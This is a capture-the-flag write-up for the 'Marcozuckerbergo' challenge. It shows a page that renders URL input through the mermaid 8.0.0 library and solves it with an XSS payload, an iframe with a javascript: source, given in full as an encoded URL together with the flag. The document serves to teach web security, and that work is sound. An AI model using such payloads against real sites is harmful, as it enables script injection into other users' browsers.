
## Title: Marcozuckerbergo
**Points:** 135  
**Solves:** 108

### Descriptions: 
Fine, I'll use a damn lib. Let's see if it's any better.

### Solution:

This is an XSS-challenge. You have to submit a url that pops `alert(1)` to get the flag.

We are presented with a webpage that takes input trought the GET-parameter `input`, url-decodes it and then feeds it into some javascript library for making tables called mermaid.

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.0.0/mermaid.min.js"></script>
<script>mermaid.initialize({startOnLoad:false});</script>
```
```js
input = decodeURIComponent(location.search.match(/input=([^&#]+)/)[1]);

window.onload=function(){
  $("#markdown").text(input);
  $("#render").text($("#markdown").text());
  mermaid.init(undefined, $("#render"));
}
```

After some mindless googling I found this github issue: `https://github.com/typora/typora-issues/issues/2289`. It contained this mermaid-js xss-payload:

```js
graph LR
id1["<iframe src=javascript:alert('xss')></iframe>"]
````

I just modified it to do `alert(1)`.
Url submitted: `http://marcozuckerbergo-01.play.midnightsunctf.se:3002/markdown?input=graph%20LR%0Aid1%5B%22%3Ciframe%20src=javascript:alert(%271%27)%3E%3C/iframe%3E%22%5D`.

**Flag:** midnight{1_gu3zz_7rust1ng_l1bs_d1dnt_w0rk_3ither:(}
